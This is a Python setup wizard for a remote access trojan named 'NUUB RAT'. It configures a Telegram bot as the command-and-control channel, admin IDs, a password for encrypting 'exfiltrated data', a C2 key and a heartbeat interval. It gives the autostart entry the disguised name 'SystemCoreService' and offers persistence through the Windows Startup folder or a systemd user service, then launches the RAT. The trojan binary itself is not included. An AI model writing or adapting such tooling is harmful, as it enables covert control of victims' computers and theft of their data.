#!/usr/bin/env python3
"""
NUUB RAT - Interactive Installer
Simple setup wizard that configures everything via terminal prompts.
"""

import json
import os
import random
import string
import shutil
import sys
import platform

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    print("""
 _   _ _   _  ___ _____    ___  ___   _   _  _____
| | | | \\ | |/ _ \\_   _|  / _ \\|_ _| \\ | |/ / _ \\
| | | |  \\| | | | || |   | | | || ||  \\| | | | |
| |_| | |\\  | |_| || |   | |_| || || |\\  | |_| |
 \\___/|_| \\_|\\___/ |_|    \\___/___|_| \\_|\\___/

   Interactive Installer v2.0
""")

def random_string(length=16):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choices(chars, k=length))

def read_input(prompt, default="", secret=False):
    if default:
        display = f"{prompt} [{default}]: "
    else:
        display = f"{prompt}: "

    if secret:
        import getpass
        try:
            value = getpass.getpass(display)
        except:
            value = input(display)
    else:
        value = input(display)

    return value if value else default

def read_yes_no(prompt, default=False):
    def_str = "y/n" if not default else "Y/n"
    value = input(f"{prompt} ({def_str}): ").lower().strip()
    if not value:
        return default
    return value in ('y', 'yes')

def read_number(prompt, default=30):
    value = input(f"{prompt} [{default}]: ").strip()
    if not value:
        return default
    try:
        return int(value)
    except ValueError:
        return default

def main():
    clear_screen()
    print_banner()

    print("This installer will configure NUUB RAT for your use.\n")

    # Check for existing config
    if os.path.exists("config.json"):
        print("[WARNING] config.json already exists!")
        if not read_yes_no("Overwrite?"):
            print("Setup cancelled.")
            return

    # Step 1: Telegram Bot Token
    print("\n" + "="*50)
    print("[1/6] Telegram Bot Configuration")
    print("="*50)
    print("Create a bot via @BotFather on Telegram and get your token.\n")

    bot_token = read_input("Bot Token", secret=True)
    if not bot_token:
        print("[ERROR] Bot token is required!")
        return

    # Step 2: Admin Chat IDs
    print("\n" + "="*50)
    print("[2/6] Admin Configuration")
    print("="*50)
    print("Send /start to your bot and note your chat ID.\n")

    admin_ids = []
    first_id = read_input("Admin Chat ID")
    if first_id:
        admin_ids.append(first_id)

    while read_yes_no("Add another admin?"):
        admin_id = read_input("Admin Chat ID")
        if admin_id:
            admin_ids.append(admin_id)

    if not admin_ids:
        print("[ERROR] At least one admin ID is required!")
        return

    # Step 3: PC Identifier
    print("\n" + "="*50)
    print("[3/6] PC Configuration")
    print("="*50)

    pc_id = read_input("PC Identifier", "PC-001")

    # Step 4: Encryption Password
    print("\n" + "="*50)
    print("[4/6] Security Configuration")
    print("="*50)
    print("This password encrypts all exfiltrated data.\n")

    enc_password = read_input("Encryption Password", secret=True)
    if not enc_password:
        enc_password = random_string(16)
        print(f"Generated random password: {enc_password}")

    # Step 5: Advanced Configuration
    print("\n" + "="*50)
    print("[5/6] Advanced Configuration")
    print("="*50)

    use_c2_encryption = read_yes_no("Enable C2 traffic encryption?", False)
    c2_key = ""
    if use_c2_encryption:
        c2_key = read_input("C2 Encryption Key", secret=True)
        if not c2_key:
            c2_key = random_string(32)
            print(f"Generated random C2 key: {c2_key}")

    heartbeat = read_number("Heartbeat interval (minutes)", 30)

    # Step 6: Generate Config
    print("\n" + "="*50)
    print("[6/6] Generating Configuration")
    print("="*50)

    config = {
        "telegram_bot_token": bot_token,
        "admin_chat_id": int(admin_ids[0]),
        "admin_chat_ids": [int(x) for x in admin_ids],
        "pc_identifier": pc_id,
        "encryption_password": enc_password,
        "master_log_filename": "log_master.txt",
        "activity_log_filename": "activity_log.csv",
        "auto_start_entry_name": "SystemCoreService",
        "log_filename": "nuub.log",
        "heartbeat_interval_minutes": heartbeat,
        "c2_encryption_key": c2_key
    }

    # Write config
    with open("config.json", "w") as f:
        json.dump(config, f, indent=4)

    print("\n[OK] Configuration saved to config.json")

    # Summary
    print("\n" + "="*50)
    print("INSTALLATION COMPLETE")
    print("="*50)

    print(f"\nConfiguration Summary:")
    print(f"  Bot Token: {bot_token[:10]}...")
    print(f"  Admin IDs: {', '.join(admin_ids)}")
    print(f"  PC ID: {pc_id}")
    print(f"  C2 Encryption: {'Enabled' if use_c2_encryption else 'Disabled'}")
    print(f"  Heartbeat: {heartbeat} minutes")

    print(f"\nNext Steps:")
    print(f"  1. Place config.json in the same directory as nuub")
    print(f"  2. Run: ./nuub")
    print(f"  3. Send /start to your bot to verify connection")

    # Optional: Add to startup
    if read_yes_no("\nAdd to system startup?", False):
        if platform.system() == "Windows":
            startup_path = os.path.join(
                os.environ['APPDATA'],
                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
            )
            source = os.path.join(os.getcwd(), 'nuub.exe')
            dest = os.path.join(startup_path, 'nuub.exe')

            if os.path.exists(source):
                shutil.copy2(source, dest)
                print(f"[OK] Added to startup: {dest}")
            else:
                print("[INFO] nuub.exe not found in current directory")

        elif platform.system() == "Linux":
            # Create systemd user service
            service_dir = os.path.expanduser("~/.config/systemd/user")
            os.makedirs(service_dir, exist_ok=True)

            exe_path = os.path.abspath("nuub")
            service_file = os.path.join(service_dir, "nuub.service")

            with open(service_file, "w") as f:
                f.write(f"""[Unit]
Description=NUUB Agent
After=network.target

[Service]
Type=simple
ExecStart={exe_path}
Restart=on-failure

[Install]
WantedBy=default.target
""")
            print(f"[OK] Created systemd service: {service_file}")
            print("     Run: systemctl --user enable --now nuub")

    # Optional: Run now
    if read_yes_no("\nRun the RAT now?", False):
        print("\nStarting NUUB RAT...")
        if platform.system() == "Windows":
            os.startfile("nuub.exe")
        else:
            os.system("./nuub &")

    print("\nInstallation finished!")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nSetup cancelled.")
        sys.exit(1)
    except Exception as e:
        print(f"\n[ERROR] {e}")
        sys.exit(1)
